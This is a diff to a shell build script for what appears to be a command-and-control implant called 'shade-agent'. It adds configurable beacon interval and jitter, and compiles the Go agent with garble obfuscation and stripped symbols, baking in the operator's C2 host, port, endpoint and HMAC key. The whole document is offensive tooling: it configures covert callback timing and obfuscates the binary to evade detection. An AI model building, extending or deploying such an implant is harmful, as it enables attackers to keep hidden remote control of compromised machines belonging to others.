@@ -22,12 +22,20 @@ if [ -z "$HMAC_KEY" ]; then
     exit 1
 fi
 
+read -p "Beacon Interval (seconds) [15]: " BEACON_INTERVAL
+BEACON_INTERVAL=${BEACON_INTERVAL:-15}
+
+read -p "Jitter (seconds) [10]: " JITTER
+JITTER=${JITTER:-10}
+
 echo ""
 echo "Configuration:"
-echo "  Host:     $C2_HOST"
-echo "  Port:     $C2_PORT (SSH)"
-echo "  Endpoint: $C2_ENDPOINT"
-echo "  HMAC Key: ${HMAC_KEY:0:16}...${HMAC_KEY: -8}"
+echo "  Host:            $C2_HOST"
+echo "  Port:            $C2_PORT (SSH)"
+echo "  Endpoint:        $C2_ENDPOINT"
+echo "  HMAC Key:        ${HMAC_KEY:0:16}...${HMAC_KEY: -8}"
+echo "  Beacon Interval: ${BEACON_INTERVAL}s"
+echo "  Jitter:          ${JITTER}s"
 echo ""
 
 # Check if garble is installed
@@ -45,7 +53,7 @@ echo "[*] Building with garble obfuscation..."
 
 # Build with garble for Linux
 GOOS=linux GOARCH=amd64 garble -literals -tiny build \
-    -ldflags "-s -w -X main.listenerHost=$C2_HOST -X main.listenerPort=$C2_PORT -X main.listenerEndpoint=$C2_ENDPOINT -X main.hmacKeyHex=$HMAC_KEY" \
+    -ldflags "-s -w -X main.listenerHost=$C2_HOST -X main.listenerPort=$C2_PORT -X main.listenerEndpoint=$C2_ENDPOINT -X main.hmacKeyHex=$HMAC_KEY -X main.reconnectIntervalStr=$BEACON_INTERVAL -X main.jitterSecondsStr=$JITTER" \
     -o shade-agent main.go
 
 if [ $? -eq 0 ]; then
